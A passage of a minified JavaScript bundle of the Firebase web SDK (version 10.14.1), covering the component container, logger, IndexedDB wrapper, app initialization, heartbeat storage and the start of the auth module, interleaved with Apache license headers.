 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Io(t){const e=[];for(const[n,r]of Object.entries(t))Array.isArray(r)?r.forEach(i=>{e.push(encodeURIComponent(n)+"="+encodeURIComponent(i))}):e.push(encodeURIComponent(n)+"="+encodeURIComponent(r));return e.length?"&"+e.join("&"):""}function XA(t,e){const n=new JA(t,e);return n.subscribe.bind(n)}class JA{constructor(e,n){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=n,this.task.then(()=>{e(this)}).catch(r=>{this.error(r)})}next(e){this.forEachObserver(n=>{n.next(e)})}error(e){this.forEachObserver(n=>{n.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,n,r){let i;if(e===void 0&&n===void 0&&r===void 0)throw new Error("Missing Observer.");ZA(e,["next","error","complete"])?i=e:i={next:e,error:n,complete:r},i.next===void 0&&(i.next=uc),i.error===void 0&&(i.error=uc),i.complete===void 0&&(i.complete=uc);const s=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?i.error(this.finalError):i.complete()}catch{}}),this.observers.push(i),s}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let n=0;n<this.observers.length;n++)this.sendOne(n,e)}sendOne(e,n){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{n(this.observers[e])}catch(r){typeof console<"u"&&console.error&&console.error(r)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function ZA(t,e){if(typeof t!="object"||t===null)return!1;for(const n of e)if(n in t&&typeof t[n]=="function")return!0;return!1}function uc(){}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function at(t){return t&&t._delegate?t._delegate:t}class Or{constructor(e,n,r){this.name=e,this.instanceFactory=n,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wr="[DEFAULT]";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class e1{constructor(e,n){this.name=e,this.container=n,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const n=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(n)){const r=new LA;if(this.instancesDeferred.set(n,r),this.isInitialized(n)||this.shouldAutoInitialize())try{const i=this.getOrInitializeService({instanceIdentifier:n});i&&r.resolve(i)}catch{}}return this.instancesDeferred.get(n).promise}getImmediate(e){var n;const r=this.normalizeInstanceIdentifier(e==null?void 0:e.identifier),i=(n=e==null?void 0:e.optional)!==null&&n!==void 0?n:!1;if(this.isInitialized(r)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:r})}catch(s){if(i)return null;throw s}else{if(i)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(n1(e))try{this.getOrInitializeService({instanceIdentifier:wr})}catch{}for(const[n,r]of this.instancesDeferred.entries()){const i=this.normalizeInstanceIdentifier(n);try{const s=this.getOrInitializeService({instanceIdentifier:i});r.resolve(s)}catch{}}}}clearInstance(e=wr){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(n=>"INTERNAL"in n).map(n=>n.INTERNAL.delete()),...e.filter(n=>"_delete"in n).map(n=>n._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=wr){return this.instances.has(e)}getOptions(e=wr){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:n={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const i=this.getOrInitializeService({instanceIdentifier:r,options:n});for(const[s,o]of this.instancesDeferred.entries()){const l=this.normalizeInstanceIdentifier(s);r===l&&o.resolve(i)}return i}onInit(e,n){var r;const i=this.normalizeInstanceIdentifier(n),s=(r=this.onInitCallbacks.get(i))!==null&&r!==void 0?r:new Set;s.add(e),this.onInitCallbacks.set(i,s);const o=this.instances.get(i);return o&&e(o,i),()=>{s.delete(e)}}invokeOnInitCallbacks(e,n){const r=this.onInitCallbacks.get(n);if(r)for(const i of r)try{i(e,n)}catch{}}getOrInitializeService({instanceIdentifier:e,options:n={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:t1(e),options:n}),this.instances.set(e,r),this.instancesOptions.set(e,n),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=wr){return this.component?this.component.multipleInstances?e:wr:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function t1(t){return t===wr?void 0:t}function n1(t){return t.instantiationMode==="EAGER"}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class r1{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const n=this.getProvider(e.name);if(n.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);n.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const n=new e1(e,this);return this.providers.set(e,n),n}getProviders(){return Array.from(this.providers.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var re;(function(t){t[t.DEBUG=0]="DEBUG",t[t.VERBOSE=1]="VERBOSE",t[t.INFO=2]="INFO",t[t.WARN=3]="WARN",t[t.ERROR=4]="ERROR",t[t.SILENT=5]="SILENT"})(re||(re={}));const i1={debug:re.DEBUG,verbose:re.VERBOSE,info:re.INFO,warn:re.WARN,error:re.ERROR,silent:re.SILENT},s1=re.INFO,o1={[re.DEBUG]:"log",[re.VERBOSE]:"log",[re.INFO]:"info",[re.WARN]:"warn",[re.ERROR]:"error"},a1=(t,e,...n)=>{if(e<t.logLevel)return;const r=new Date().toISOString(),i=o1[e];if(i)console[i](`[${r}]  ${t.name}:`,...n);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class Fd{constructor(e){this.name=e,this._logLevel=s1,this._logHandler=a1,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in re))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?i1[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,re.DEBUG,...e),this._logHandler(this,re.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,re.VERBOSE,...e),this._logHandler(this,re.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,re.INFO,...e),this._logHandler(this,re.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,re.WARN,...e),this._logHandler(this,re.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,re.ERROR,...e),this._logHandler(this,re.ERROR,...e)}}const l1=(t,e)=>e.some(n=>t instanceof n);let Xm,Jm;function u1(){return Xm||(Xm=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function c1(){return Jm||(Jm=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const $_=new WeakMap,gh=new WeakMap,W_=new WeakMap,cc=new WeakMap,Ud=new WeakMap;function h1(t){const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("success",s),t.removeEventListener("error",o)},s=()=>{n(tr(t.result)),i()},o=()=>{r(t.error),i()};t.addEventListener("success",s),t.addEventListener("error",o)});return e.then(n=>{n instanceof IDBCursor&&$_.set(n,t)}).catch(()=>{}),Ud.set(e,t),e}function d1(t){if(gh.has(t))return;const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("complete",s),t.removeEventListener("error",o),t.removeEventListener("abort",o)},s=()=>{n(),i()},o=()=>{r(t.error||new DOMException("AbortError","AbortError")),i()};t.addEventListener("complete",s),t.addEventListener("error",o),t.addEventListener("abort",o)});gh.set(t,e)}let yh={get(t,e,n){if(t instanceof IDBTransaction){if(e==="done")return gh.get(t);if(e==="objectStoreNames")return t.objectStoreNames||W_.get(t);if(e==="store")return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return tr(t[e])},set(t,e,n){return t[e]=n,!0},has(t,e){return t instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in t}};function f1(t){yh=t(yh)}function p1(t){return t===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...n){const r=t.call(hc(this),e,...n);return W_.set(r,e.sort?e.sort():[e]),tr(r)}:c1().includes(t)?function(...e){return t.apply(hc(this),e),tr($_.get(this))}:function(...e){return tr(t.apply(hc(this),e))}}function m1(t){return typeof t=="function"?p1(t):(t instanceof IDBTransaction&&d1(t),l1(t,u1())?new Proxy(t,yh):t)}function tr(t){if(t instanceof IDBRequest)return h1(t);if(cc.has(t))return cc.get(t);const e=m1(t);return e!==t&&(cc.set(t,e),Ud.set(e,t)),e}const hc=t=>Ud.get(t);function g1(t,e,{blocked:n,upgrade:r,blocking:i,terminated:s}={}){const o=indexedDB.open(t,e),l=tr(o);return r&&o.addEventListener("upgradeneeded",u=>{r(tr(o.result),u.oldVersion,u.newVersion,tr(o.transaction),u)}),n&&o.addEventListener("blocked",u=>n(u.oldVersion,u.newVersion,u)),l.then(u=>{s&&u.addEventListener("close",()=>s()),i&&u.addEventListener("versionchange",h=>i(h.oldVersion,h.newVersion,h))}).catch(()=>{}),l}const y1=["get","getKey","getAll","getAllKeys","count"],v1=["put","add","delete","clear"],dc=new Map;function Zm(t,e){if(!(t instanceof IDBDatabase&&!(e in t)&&typeof e=="string"))return;if(dc.get(e))return dc.get(e);const n=e.replace(/FromIndex$/,""),r=e!==n,i=v1.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!(i||y1.includes(n)))return;const s=async function(o,...l){const u=this.transaction(o,i?"readwrite":"readonly");let h=u.store;return r&&(h=h.index(l.shift())),(await Promise.all([h[n](...l),i&&u.done]))[0]};return dc.set(e,s),s}f1(t=>({...t,get:(e,n,r)=>Zm(e,n)||t.get(e,n,r),has:(e,n)=>!!Zm(e,n)||t.has(e,n)}));/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _1{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(n=>{if(w1(n)){const r=n.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(n=>n).join(" ")}}function w1(t){const e=t.getComponent();return(e==null?void 0:e.type)==="VERSION"}const vh="@firebase/app",eg="0.10.13";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Tn=new Fd("@firebase/app"),E1="@firebase/app-compat",T1="@firebase/analytics-compat",I1="@firebase/analytics",S1="@firebase/app-check-compat",A1="@firebase/app-check",C1="@firebase/auth",R1="@firebase/auth-compat",x1="@firebase/database",k1="@firebase/data-connect",P1="@firebase/database-compat",N1="@firebase/functions",D1="@firebase/functions-compat",b1="@firebase/installations",V1="@firebase/installations-compat",O1="@firebase/messaging",L1="@firebase/messaging-compat",M1="@firebase/performance",F1="@firebase/performance-compat",U1="@firebase/remote-config",j1="@firebase/remote-config-compat",z1="@firebase/storage",B1="@firebase/storage-compat",$1="@firebase/firestore",W1="@firebase/vertexai-preview",q1="@firebase/firestore-compat",H1="firebase",G1="10.14.1";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _h="[DEFAULT]",K1={[vh]:"fire-core",[E1]:"fire-core-compat",[I1]:"fire-analytics",[T1]:"fire-analytics-compat",[A1]:"fire-app-check",[S1]:"fire-app-check-compat",[C1]:"fire-auth",[R1]:"fire-auth-compat",[x1]:"fire-rtdb",[k1]:"fire-data-connect",[P1]:"fire-rtdb-compat",[N1]:"fire-fn",[D1]:"fire-fn-compat",[b1]:"fire-iid",[V1]:"fire-iid-compat",[O1]:"fire-fcm",[L1]:"fire-fcm-compat",[M1]:"fire-perf",[F1]:"fire-perf-compat",[U1]:"fire-rc",[j1]:"fire-rc-compat",[z1]:"fire-gcs",[B1]:"fire-gcs-compat",[$1]:"fire-fst",[q1]:"fire-fst-compat",[W1]:"fire-vertex","fire-js":"fire-js",[H1]:"fire-js-all"};/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ml=new Map,Q1=new Map,wh=new Map;function tg(t,e){try{t.container.addComponent(e)}catch(n){Tn.debug(`Component ${e.name} failed to register with FirebaseApp ${t.name}`,n)}}function Pi(t){const e=t.name;if(wh.has(e))return Tn.debug(`There were multiple attempts to register component ${e}.`),!1;wh.set(e,t);for(const n of ml.values())tg(n,t);for(const n of Q1.values())tg(n,t);return!0}function jd(t,e){const n=t.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),t.container.getProvider(e)}function qn(t){return t.settings!==void 0}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Y1={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},nr=new To("app","Firebase",Y1);/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class X1{constructor(e,n,r){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},n),this._name=n.name,this._automaticDataCollectionEnabled=n.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new Or("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw nr.create("app-deleted",{appName:this._name})}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $i=G1;function q_(t,e={}){let n=t;typeof e!="object"&&(e={name:e});const r=Object.assign({name:_h,automaticDataCollectionEnabled:!1},e),i=r.name;if(typeof i!="string"||!i)throw nr.create("bad-app-name",{appName:String(i)});if(n||(n=z_()),!n)throw nr.create("no-options");const s=ml.get(i);if(s){if(pl(n,s.options)&&pl(r,s.config))return s;throw nr.create("duplicate-app",{appName:i})}const o=new r1(i);for(const u of wh.values())o.addComponent(u);const l=new X1(n,r,o);return ml.set(i,l),l}function H_(t=_h){const e=ml.get(t);if(!e&&t===_h&&z_())return q_();if(!e)throw nr.create("no-app",{appName:t});return e}function rr(t,e,n){var r;let i=(r=K1[t])!==null&&r!==void 0?r:t;n&&(i+=`-${n}`);const s=i.match(/\s|\//),o=e.match(/\s|\//);if(s||o){const l=[`Unable to register library "${i}" with version "${e}":`];s&&l.push(`library name "${i}" contains illegal characters (whitespace or "/")`),s&&o&&l.push("and"),o&&l.push(`version name "${e}" contains illegal characters (whitespace or "/")`),Tn.warn(l.join(" "));return}Pi(new Or(`${i}-version`,()=>({library:i,version:e}),"VERSION"))}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const J1="firebase-heartbeat-database",Z1=1,oo="firebase-heartbeat-store";let fc=null;function G_(){return fc||(fc=g1(J1,Z1,{upgrade:(t,e)=>{switch(e){case 0:try{t.createObjectStore(oo)}catch(n){console.warn(n)}}}}).catch(t=>{throw nr.create("idb-open",{originalErrorMessage:t.message})})),fc}async function eC(t){try{const n=(await G_()).transaction(oo),r=await n.objectStore(oo).get(K_(t));return await n.done,r}catch(e){if(e instanceof xn)Tn.warn(e.message);else{const n=nr.create("idb-get",{originalErrorMessage:e==null?void 0:e.message});Tn.warn(n.message)}}}async function ng(t,e){try{const r=(await G_()).transaction(oo,"readwrite");await r.objectStore(oo).put(e,K_(t)),await r.done}catch(n){if(n instanceof xn)Tn.warn(n.message);else{const r=nr.create("idb-set",{originalErrorMessage:n==null?void 0:n.message});Tn.warn(r.message)}}}function K_(t){return`${t.name}!${t.options.appId}`}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tC=1024,nC=30*24*60*60*1e3;class rC{constructor(e){this.container=e,this._heartbeatsCache=null;const n=this.container.getProvider("app").getImmediate();this._storage=new sC(n),this._heartbeatsCachePromise=this._storage.read().then(r=>(this._heartbeatsCache=r,r))}async triggerHeartbeat(){var e,n;try{const i=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),s=rg();return((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,((n=this._heartbeatsCache)===null||n===void 0?void 0:n.heartbeats)==null)||this._heartbeatsCache.lastSentHeartbeatDate===s||this._heartbeatsCache.heartbeats.some(o=>o.date===s)?void 0:(this._heartbeatsCache.heartbeats.push({date:s,agent:i}),this._heartbeatsCache.heartbeats=this._heartbeatsCache.heartbeats.filter(o=>{const l=new Date(o.date).valueOf();return Date.now()-l<=nC}),this._storage.overwrite(this._heartbeatsCache))}catch(r){Tn.warn(r)}}async getHeartbeatsHeader(){var e;try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null||this._heartbeatsCache.heartbeats.length===0)return"";const n=rg(),{heartbeatsToSend:r,unsentEntries:i}=iC(this._heartbeatsCache.heartbeats),s=fl(JSON.stringify({version:2,heartbeats:r}));return this._heartbeatsCache.lastSentHeartbeatDate=n,i.length>0?(this._heartbeatsCache.heartbeats=i,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),s}catch(n){return Tn.warn(n),""}}}function rg(){return new Date().toISOString().substring(0,10)}function iC(t,e=tC){const n=[];let r=t.slice();for(const i of t){const s=n.find(o=>o.agent===i.agent);if(s){if(s.dates.push(i.date),ig(n)>e){s.dates.pop();break}}else if(n.push({agent:i.agent,dates:[i.date]}),ig(n)>e){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}class sC{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return qA()?HA().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const n=await eC(this.app);return n!=null&&n.heartbeats?n:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){var n;if(await this._canUseIndexedDBPromise){const i=await this.read();return ng(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){var n;if(await this._canUseIndexedDBPromise){const i=await this.read();return ng(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:i.lastSentHeartbeatDate,heartbeats:[...i.heartbeats,...e.heartbeats]})}else return}}function ig(t){return fl(JSON.stringify({version:2,heartbeats:t})).length}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function oC(t){Pi(new Or("platform-logger",e=>new _1(e),"PRIVATE")),Pi(new Or("heartbeat",e=>new rC(e),"PRIVATE")),rr(vh,eg,t),rr(vh,eg,"esm2017"),rr("fire-js","")}oC("");var aC="firebase",lC="10.14.1";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */rr(aC,lC,"app");function zd(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function Q_(){return{"dependent-sdk-initialized-before-auth":"Another Firebase SDK was initialized and is trying to use Auth before Auth is initialized. Please be sure to call `initializeAuth` or `getAuth` before starting any other Firebase SDK."}}const uC=Q_,Y_=new To("auth","Firebase",Q_());/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const gl=new Fd("@firebase/auth");function cC(t,...e){gl.logLevel<=re.WARN&&gl.warn(`Auth (${$i}): ${t}`,...e)}function Va(t,...e){gl.logLevel<=re.ERROR&&gl.error(`Auth (${$i}): ${t}`,...e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
